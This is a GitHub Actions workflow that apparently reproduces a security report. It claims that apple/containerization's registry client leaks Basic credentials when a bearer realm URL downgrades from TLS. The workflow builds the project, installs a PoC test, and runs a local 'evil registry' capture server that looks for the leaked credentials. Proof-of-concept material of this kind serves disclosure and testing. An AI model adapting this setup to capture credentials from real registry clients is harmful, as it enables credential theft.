name: PoC OE1107246042217 Bearer Realm TLS Downgrade SSRF

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  poc:
    name: RegistryClient Bearer Realm Credential Leak
    runs-on: ubuntu-latest
    container:
      image: swift:6.2

    steps:
      - name: Checkout PoC repo
        uses: actions/checkout@v4
        with:
          path: poc

      - name: Checkout apple/containerization
        uses: actions/checkout@v4
        with:
          repository: apple/containerization
          ref: main
          path: containerization

      - name: Install dependencies
        run: |
          apt-get update -qq
          apt-get install -y --no-install-recommends python3 libarchive-dev libssl-dev pkg-config

      - name: Verify Swift version
        run: swift --version

      - name: L1 Static evidence no scheme validation
        run: |
          grep -n "realm" containerization/Sources/ContainerizationOCI/Client/RegistryClient+Token.swift
          sed -n 155,175p containerization/Sources/ContainerizationOCI/Client/RegistryClient.swift
          result=$(grep -rn "realm.*scheme" containerization/Sources/ContainerizationOCI/Client/ 2>/dev/null || true)
          if [ -z "$result" ]; then echo "[L1-PASS] Zero scheme-validation references found for realm URL"; else echo "$result"; fi

      - name: Install PoC Swift test
        run: cp poc/Tests/ContainerizationOCITests/BearerRealmDowngradeTest.swift containerization/Tests/ContainerizationOCITests/BearerRealmDowngradeTest.swift

      - name: Build ContainerizationOCI tests
        working-directory: containerization
        run: swift build --target ContainerizationOCI 2>&1 | tail -5

      - name: Run E2E - start servers and Swift test together
        run: |
          python3 poc/scripts/evil_registry.py > /tmp/capture.log 2>&1 &
          SERVER_PID=$!
          sleep 2
          echo "[*] Server PID: $SERVER_PID"
          cat /tmp/capture.log
          cd containerization
          EVIL_REGISTRY_RUNNING=1 swift test --filter BearerRealmDowngradeTest 2>&1 | tee /tmp/swift_test.txt
          wait $SERVER_PID 2>/dev/null || true

      - name: E2E results
        run: |
          echo "=== Capture server log ==="
          cat /tmp/capture.log
          echo "=== Swift test tail ==="
          tail -20 /tmp/swift_test.txt
          grep -q "L1-PASS" /tmp/swift_test.txt && echo "[RESULT] L1+L2 PASS" || true
          grep -q "TLS-downgrade\|Basic.*credentials" /tmp/capture.log && echo "[RESULT] E2E PASS" || true

      - name: Upload artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: poc-results
          path: |
            /tmp/capture.log
            /tmp/swift_test.txt
